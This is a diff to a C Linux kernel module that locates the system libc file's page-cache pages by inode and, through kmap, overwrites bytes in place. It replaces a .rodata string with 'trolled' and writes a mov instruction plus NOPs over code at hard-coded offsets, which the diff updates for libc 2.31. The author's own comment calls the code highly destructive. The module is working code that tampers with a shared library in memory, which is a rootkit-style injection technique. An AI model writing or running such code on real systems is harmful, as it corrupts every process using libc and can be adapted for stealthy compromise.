@@ -1,4 +1,3 @@
-
 #include "taskutil.h"
 #include "regset.h"
 #include "memutil.h"
@@ -6,10 +5,10 @@
 #include "address_space.h"
 
 #ifndef VICTIM_FILE
-#define VICTIM_FILE "/lib/x86_64-linux-gnu/libc-2.33.so"
+#define VICTIM_FILE "/lib/x86_64-linux-gnu/libc-2.31.so"
 #endif
 
-#define VICTIM_FILE_OVERRIDE "/lib/x86_64-linux-gnu/libc-2.33.so"
+#define VICTIM_FILE_OVERRIDE "/lib/x86_64-linux-gnu/libc-2.31.so"
 
 #define STRINGIFY(A) #A
 #define TOSTRING(A) STRINGIFY(A) //I don't why the fuck this works. If I had to take a guess, it is because when you pass in A in TOSTRING, you pass in the value of A which is then stringifyed.
@@ -17,14 +16,14 @@
 char* troll = "trolled";
 
 
-char trolling_opcodes[] = { 0x48, 0xC7, 0xC6, 0x30, 0x10, 0x19, 0x00, 0x80, 0x80, 0x80 }; //append with a shit ton of nops
+char trolling_opcodes[] = { 0x48, 0xC7, 0xC6, 0x30, 0xD0, 0x19, 0x00, 0x90, 0x90, 0x90 }; //append with a shit ton of nops
 int init_module(void)
 {
  	void* map;
   char* ptr;
   struct page* page;
   int count;
-  char* path = VICTIM_FILE_OVERRIDE;//TOSTRING(VICTIM_FILE);
+  char* path = TOSTRING(VICTIM_FILE);//TOSTRING(VICTIM_FILE);
 //  printk("path after stringify %d\n", linux); //stupid fucking macro nobody like you you cuck fuck you
 	struct inode* i = get_file_path(path);//
   if(!i){
@@ -40,23 +39,42 @@ int init_module(void)
     return 0;
   }
   printk(KERN_INFO "This page has an address_space object\n");
-	//page = find_get_page(i->i_mapping,0); // nah this is fine
-  page = find_page_inode(i, 0x00191020); //ok so this actually works
+  page = find_page_inode(i, 0);
+  if(!page){
+    printk(KERN_INFO "Page failed\n");
+    return 0;
+  }
+
+  /*map = kmap(page);
+  *((char*)map) = 'A';
+  kunmap(page);*/
+
+
+  /*
+  THE UNCOMMENTED CODE BELOW IS HIGHLY DESTRUCTIVE. DO NOT, UNDER ANY CIRCUMSTANCE, RUN IT
+
+  */
+
+
+  page = find_page_inode(i, 0x0019d030); //ok so this actually works
   if(!page){
     printk(KERN_INFO "Page failed\n");
     return 0;
   }
   map = kmap(page);
-  //printk(KERN_INFO "%c", *((char*)map + pg_off(0x00191030)));
-  ptr = (char*)map + pg_off(0x00191030); //.rodata location
+  ptr = (char*)map + pg_off(0x0019d030); //.rodata location
   for(count = 0; count<7; count++,ptr++){ //doin a little trolling
     *ptr = *(troll+count);
   }
   kunmap(map);
-
-  page = find_page_inode(i, 0x00107c14);
+  ClearPageReferenced(page); //the page dump won't dump referenced pages so clear the bit
+  page = find_page_inode(i, 0x001111d4);
+  if(!page){
+    printk(KERN_INFO "Page failed\n");
+    return 0;
+  }
   map = kmap(page);
-  ptr = (char*)map + pg_off(0x00107c14);
+  ptr = (char*)map + pg_off(0x001111d4);
   for(count = 0; count < 10; count++, ptr++){
     *ptr = trolling_opcodes[count];
   }
